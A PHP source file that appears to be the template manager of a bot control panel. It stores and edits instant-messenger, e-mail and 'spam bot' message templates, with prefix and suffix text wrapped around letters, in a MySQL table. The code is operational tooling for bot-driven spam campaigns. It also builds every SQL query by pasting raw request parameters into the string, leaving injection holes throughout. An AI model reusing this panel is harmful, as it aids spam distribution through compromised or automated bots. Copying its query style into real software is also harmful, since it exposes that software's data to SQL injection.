<?

include_once('auth.php');


set_magic_quotes_runtime(1);

if(is_readable('html.php')) include_once('html.php');
else die('Could not find HTML library.');

if(is_readable('mycommon.php')) require('mycommon.php');
else die('Could not open configuration file.');

if(is_readable('lang.php')) include_once('lang.php');
else die('Could not find language library.');


$mres = mysql_connect($BOT_DBHOST,$BOT_DBLOGIN,$BOT_DBPASS) or die('Check MySQl Options.'.mysql_error());
if(!mysql_select_db($BOT_DBNAME))
die('<p><font color=#990000>Could not USE MAIN DB</font><br>Mysql message:'.mysql_error().'</p>');





if(array_key_exists('ajax',$_GET)){

	//Creating AJAX-friendly tech.

	require_once "lib/JsHttpRequest/JsHttpRequest.php";
	$JsHttpRequest =& new JsHttpRequest("windows-1251");

	if(isset($_GET['action']))
	parse_action();

	$id = $_GET['id'];
	$tname = urldecode($_GET['tname']);
	$type = $_GET['type'];

	$_RESULT = array(
	"ZUMESSAGESS"     => get_all_messages($tname), //'<a href="javascript:doLoad(\'action=bz&id='.$id.'\');">'.$id.rand(2323,23123).'-zz</a>',
	"ZUTMPL"   => get_all_tmpl(),
	"ZUTMPLCURRENT"=>gen_current_inf($tname,$type),
	"SAVEMSG" => $tname,
	"MSG"=>''
	//"ZULANDS"=>get_zu_land(),
	//"ZUID"=>$id
	);

	exit;

};





$CTRL=2;
$CTRL_ZU=2;
$MSG = '';
if(!isset($_GET['wohead']))
include_once('head.php');

if(isset($_POST['addzutmpl'])){
	$MSG = addzutmpl();
};


if(isset($_POST['SAVEMSG'])){
	save_messages($_POST['SAVEMSG']);

};


get_all_tmpl();

$Ini_ARR = array(
'ZUTMPL'=>get_all_tmpl(),
'ZUMSG'=>$MSG
);


HTML_ZUPACHA_TPL($Ini_ARR);


//functions++++++++++++++++++++++++++++++++++++


function  parse_action(){
	global $_GET;

	switch ($_GET['action']){
		case 'delmsg':
			delete_msg_record($_GET['id']);
			break;
		case 'deltmpl':
			delete_template($_GET['tname']);
			break;
		case 'addmsg':
			add_im_msg($_GET['tname'],$_GET['type']);
			break;
		case 'addmailmsg':
			add_mail_msg($_GET['tname'],$_GET['type']);
			break;
	};

	return '';
};


function add_mail_msg($tname,$type){
	global $mres;

	$q = "INSERT INTO `tmpl_zu`(`Tname`,`Ttype`) values('".$tname."','".$type."')";
	mysql_query($q,$mres);

	return '';

};




function add_im_msg($tname,$type){
	global $mres;


	$q = "INSERT INTO `tmpl_zu`(`Tname`,`Ttype`) values('".$tname."','".$type."')";
	mysql_query($q,$mres);

	return '';

};





function save_messages($tmpl=''){
	global $mres,$_POST,$MSG;

	$numb = array();
	//print_r($_POST);
	foreach ($_POST as $key=>$val){
		if($key!='SAVEMSG')
		if(strpos(strtolower('z'.$key),'msg'))
		$numb[] = intval(substr($key,3));
	};

	foreach ($numb as $n){

		$wmsg = str_replace('%%','%',$_POST['msg'.$n]);

		$q = "UPDATE `tmpl_zu` SET `Tmessage`='".$wmsg."' WHERE `Tid`=".$n;
		mysql_query($q,$mres);
		//echo $q.'<br>';

		if(strlen(trim($_POST['msg'.$n]))==0){

			$q = "DELETE FROM `tmpl_zu` WHERE `Tid`=".$n;
			mysql_query($q,$mres);

		};


	};
	$MSG = '<font color=green>Messages for template &laquo;<font color=black>'.$tmpl.'</font>&raquo; saved.</font>';

	return '';
};




function delete_template($tname){
	global $mres;

	$q = "DELETE FROM `tmpl_zu` WHERE `Tname`='".$tname."'";
	@mysql_query($q,$mres);

};


function delete_msg_record($id){
	global $mres;

	$q = "DELETE FROM `tmpl_zu` WHERE `Tid`='".$id."'";
	@mysql_query($q,$mres);
	return '';



};




function addzutmpl(){
	global $_POST,$mres,$MSG;


	$name = trim($_POST['TPLNAME']);

	if(strlen(trim($name))==0)
	$name = date('H:i:s d.m.y',time());

	$type = $_POST['TPLTYPE'];

	//$name.$type;


	$q = "SELECT * FROM `tmpl_zu` WHERE `Tname`='".$name."'";
	$re = mysql_query($q,$mres);

	if(mysql_num_rows($re)){

		while($row = mysql_fetch_object($re)){

			if($type=='IM'){

				if($row->Ttype=='mp'){
					$MSG = 'Message : &laquo;'.$name.'&raquo; Already Exist in E-Mail templates. Try other name.';
					return $MSG;
				};
				if($row->Ttype=='ms'){
					$MSG = 'Message : &laquo;'.$name.'&raquo; Already Exist in E-Mail templates. Try other name.';
					return $MSG;
				};
				
								if($row->Ttype=='sbp'){
					$MSG = 'Message : &laquo;'.$name.'&raquo; Already Exist in Spam bots templates. Try other name.';
					return $MSG;
				};
				
			};

			
			
			if($type=='MAIL'){

				if($row->Ttype=='im'){
					$MSG = 'Message : &laquo;'.$name.'&raquo; Already Exist in IM templates. Try other name.';
					return $MSG;
				};
				
				if($row->Ttype=='sbp'){
					$MSG = 'Message : &laquo;'.$name.'&raquo; Already Exist in Spam bots templates. Try other name.';
					return $MSG;
				};
			};



			if($type=='SB'){


				if($row->Ttype=='im'){
					$MSG = 'Message : &laquo;'.$name.'&raquo; Already Exist in IM templates. Try other name.';
					return $MSG;
				};
				if($row->Ttype=='mp'){
					$MSG = 'Message : &laquo;'.$name.'&raquo; Already Exist in E-Mail templates. Try other name.';
					return $MSG;
				};
				if($row->Ttype=='ms'){
					$MSG = 'Message : &laquo;'.$name.'&raquo; Already Exist in E-Mail templates. Try other name.';
					return $MSG;
				};




			};


		};


	};



	if($type=='MAIL'){
		$q = 'INSERT INTO `tmpl_zu`(`Tname`,`Ttype`,`Tmessage`) values("'.$name.'","mp","")';
		mysql_query($q,$mres);
		$q = 'INSERT INTO `tmpl_zu`(`Tname`,`Ttype`,`Tmessage`) values("'.$name.'","ms","")';
		mysql_query($q,$mres);
	};


	if($type=='IM'){
		$q = 'INSERT INTO `tmpl_zu`(`Tname`,`Ttype`,`Tmessage`) values("'.$name.'","im","")';
		mysql_query($q,$mres);
	};


	if($type=='SB'){
		$q = 'INSERT INTO `tmpl_zu`(`Tname`,`Ttype`,`Tmessage`) values("'.$name.'","sbp","")';
		mysql_query($q,$mres);
		$q = 'INSERT INTO `tmpl_zu`(`Tname`,`Ttype`,`Tmessage`) values("'.$name.'","sbs","")';
		mysql_query($q,$mres);
	};

	return '';
};










function get_all_messages($tname){
	global $mres;

	$ret = '';

	$q = "SELECT * FROM `tmpl_zu` WHERE `Tname`='".$tname."'";
	$re = mysql_query($q,$mres);
	if(!mysql_num_rows($re))
	return '';

	$cnt= 0;

	while(@$row = mysql_fetch_object($re)){

		$examplpref = '<a title="'."EXAMPLE LETTER:\n"."\n".$row->Tmessage."\n".'Hello jack!'."\n"."\n".'...Letter`s body...'."\n"."\n".'Good bye!" style=\'text-decoration: overline; color: #606680\'>';
		$examplsuf = '<a title="'."EXAMPLE LETTER:\n"."\n".'Hello jack!'."\n"."\n".'...Letter`s body...'."\n"."\n".'Good bye!'."\n".$row->Tmessage.'" style=\'text-decoration: underline; color: #606680\'>';


		$cnt +=1;
		if($row->Ttype=='im'){
			$ret .= " <fieldset> "."\n"
			." <legend>Message <strong>".$cnt."</strong>: body &nbsp;&nbsp;(<a href=\"javascript:doLoad('action=delmsg&id=".$row->Tid."&tname=".urlencode($row->Tname)."');\">Remove message</a>) </legend> "."\n"
			." <textarea name=\"msg".$row->Tid."\" cols=\"70\" rows=\"4\">".$row->Tmessage."</textarea> "."\n"
			." </fieldset> "."\n";
		}elseif($row->Ttype=='sbp' || $row->Ttype=='sbs'){
				$ret .= " <fieldset> "."\n"
		." <legend>Type: Spam Bot mail ".($row->Ttype=='sbp'? '<u>'.$examplpref.'Preffix</a></u>' : '<u>'.$examplsuf.'Suffix</a></u>' ).".<strong>".$cnt."</strong>: body &nbsp;&nbsp;(<a href=\"javascript:doLoad('action=delmsg&id=".$row->Tid."&tname=".urlencode($row->Tname)."&type=sbp');\">Remove message</a>) </legend> "."\n"
		." <textarea name=\"msg".$row->Tid."\" cols=\"70\" rows=\"3\">".$row->Tmessage."</textarea> "."\n"
		." </fieldset> "."\n";
		}else
		$ret .= " <fieldset> "."\n"
		." <legend>Type: E-Mail ".($row->Ttype=='mp'? '<u>'.$examplpref.'Preffix</a></u>' : '<u>'.$examplsuf.'Suffix</a></u>' ).".<strong>".$cnt."</strong>: body &nbsp;&nbsp;(<a href=\"javascript:doLoad('action=delmsg&id=".$row->Tid."&tname=".urlencode($row->Tname)."');\">Remove message</a>) </legend> "."\n"
		." <textarea name=\"msg".$row->Tid."\" cols=\"70\" rows=\"2\">".$row->Tmessage."</textarea> "."\n"
		." </fieldset> "."\n";

	};

	$ret .= " </td></tr> "."\n"
	." <tr><td colspan=\"2\"> "."\n"
	." </td></tr> "."\n"
	." <tr><br><td width=\"80%\"><input type=\"reset\" name=\"Submit4\" value=\"Restore\">&nbsp;&nbsp;<input type=\"submit\" name=\"Submit4\" value=\"Save\"> "."\n"
	." </td> "."\n";


	return  $ret;
};







function get_all_tmpl(){

	$tbl = " <table width=\"90%\" height=\"100%\" border=\"0\" cellpadding=\"2\" cellspacing=\"2\"> "."\n"
	." <tr> "."\n"
	." <td >&nbsp;</td> "."\n"
	." <td class=\"bhead\">Template name </td> "."\n"
	." <td class=\"bhead\" nowrap=\"nowrap\">Msg count | Size </td> "."\n"
	." <td nowrap=\"nowrap\" class=\"bhead\">Action with task </td> "."\n"
	." </tr> "."\n";


	$tbl .= " <tr> "."\n"
	." <th class=\"file1\" scope=\"row\"><img src=\"img/im.gif\" width=\"16\" height=\"16\" alt=\"Internet messengers Templates\"></th> "."\n"
	." <td colspan=\"3\" class=\"file1\" bgcolor=\"#F8C5AF\">Type: IM </td> "."\n"
	." </tr> "."\n";

	$tbl .= get_alltmpl_of_type('im');

	$tbl .=" <tr> "."\n"
	." <th class=\"file1\" scope=\"row\"><img src=\"img/mail_ok2.gif\" width=\"16\" height=\"16\" alt=\"E-Mail Templates\"></th> "."\n"
	." <td colspan=\"3\" bgcolor=\"#F8C5AF\" class=\"file1\">Type : Mail </td> "."\n"
	." </tr> "."\n";


	$tbl .= get_alltmpl_of_type('mp');


	$tbl .=" <tr> "."\n"
	." <th class=\"file1\" scope=\"row\"><img src=\"img/spambots_ok2.gif\" width=\"22\" height=\"14\" alt=\"Templates for spam bots\"></th> "."\n"
	." <td colspan=\"3\" bgcolor=\"#F8C5AF\" class=\"file1\">Type : Templates for spam bots</td> "."\n"
	." </tr> "."\n";


	$tbl .= get_alltmpl_of_type('sbp');




	$tbl .= "</table> "."\n";

	return $tbl;

};






function get_alltmpl_of_type($type){
	global $mres;

	if($type=='ms' || $type=='mp')
	$q = "SELECT * FROM `tmpl_zu` WHERE `Ttype` !='sbs' AND `Ttype` !='sbp' AND `Ttype` !='im'  group by `Tname`";
	elseif($type=='sbs' || $type=='sbp')
		$q = "SELECT * FROM `tmpl_zu` WHERE `Ttype` !='mp' AND `Ttype` !='ms' AND `Ttype` !='im'  group by `Tname`";
	else
	$q = "SELECT * FROM `tmpl_zu` WHERE `Ttype`='".$type."' group by `Tname`";

	$result = mysql_query($q,$mres);
	if(!@mysql_num_rows($result))
	return '';

	$tbl = '';

	while($row = mysql_fetch_object($result)){


		$tbl .="<th class=\"file1\" scope=\"row\">&nbsp;</th> "."\n"
		." <td nowrap=\"nowrap\" class=\"file1\"><a href=\"javascript:doLoad('action=edittmpl&tname=".urlencode($row->Tname)."&type=".$type."');\" style='text-decoration: none; color: #606680' >".$row->Tname."</a></td> "."\n"
		." <td class=\"file1\">".get_messages_size($row->Tname,1)."&nbsp;&nbsp;<font color=#CCCCC>|</font>&nbsp;".number_format(get_messages_size($row->Tname))."</td> "."\n"
		." <td class=\"file1\"><a href=\"javascript:doLoad('action=deltmpl&tname=".urlencode($row->Tname)."&type=".$type."');\">Delete</a>&nbsp;|&nbsp;<a href=\"javascript:doLoad('action=edittmpl&tname=".urlencode($row->Tname)."&type=".$type."');\">Edit</a> </td> "."\n"
		." </tr> "."\n"
		." <tr> "."\n";




	};


	return  $tbl;

};







function get_messages_size($tname,$count=0){
	global $mres;

	$q = 'SELECT * FROM `tmpl_zu` WHERE `Tname`="'.$tname.'"';
	$re = mysql_query($q,$mres);
	if(!mysql_num_rows($re))
	return '0';

	$cnt=0;
	$size = 0;
	while(@$row = mysql_fetch_object($re)){
		if($count)
		$cnt +=1;
		else
		$size += strlen($row->Tmessage);
	};

	if($count)
	return $cnt;

	return $size;
};




function gen_current_inf($tname,$type){


	if(strtolower($type)=='im'){
		$ret = "<img src=\"img/im.gif\" width=\"16\" height=\"16\" alt=\"Template Type: IMessenger\">&nbsp; <font color=black><b>".$tname."</b></font>\n"
		." | Messagess &#8212;".get_messages_size($tname,1)."&nbsp;&nbsp;| Size &#8212;&nbsp;".number_format(get_messages_size($tname))." bytes&nbsp;&nbsp;|&nbsp; <input name=\"TPLADDMSG\" type=\"button\" value=\"Add message\" onClick=\"doLoad('action=addmsg&tname=".urlencode($tname)."&type=".$type."');\">";
	}elseif(strtolower($type)=='sbp' || strtolower($type)=='sbs' ){
$ret = "<img src=\"img/spambots_ok.gif\" alt=\"Template Type: Spam bots\">&nbsp; <font color=black><b>".$tname."</b></font>\n"
	." | Messagess &#8212;".get_messages_size($tname,1)."&nbsp;&nbsp;| Size &#8212;&nbsp;".number_format(get_messages_size($tname))." bytes&nbsp;&nbsp;|&nbsp;Add: <input name=\"TPLADDMSG\" type=\"button\" value=\"Prefix\" onClick=\"doLoad('action=addmailmsg&tname=".urlencode($tname)."&type=sbp');\">&nbsp;or&nbsp;<input name=\"TPLADDMSG\" type=\"button\" value=\"Suffix\" onClick=\"doLoad('action=addmailmsg&tname=".urlencode($tname)."&type=sbs');\">";
		}else
$ret = "<img src=\"img/mail_ok2.gif\" width=\"16\" height=\"16\" alt=\"Tmplate type: E-Mail\">&nbsp; <font color=black><b>".$tname."</b></font>\n"
	." | Messagess &#8212;".get_messages_size($tname,1)."&nbsp;&nbsp;| Size &#8212;&nbsp;".number_format(get_messages_size($tname))." bytes&nbsp;&nbsp;|&nbsp;Add: <input name=\"TPLADDMSG\" type=\"button\" value=\"Prefix\" onClick=\"doLoad('action=addmailmsg&tname=".urlencode($tname)."&type=mp');\">&nbsp;or&nbsp;<input name=\"TPLADDMSG\" type=\"button\" value=\"Suffix\" onClick=\"doLoad('action=addmailmsg&tname=".urlencode($tname)."&type=ms');\">";

//Template Type: Spam bots
	return $ret;
};



/*
function get_type_by_name($tname){
global $mres;

$q = "SELECT `Ttype` FROM `tmpl_zu` WHERE `Tname`='".$tname."'";
mysql_query($q,$mres);


};
*/



?>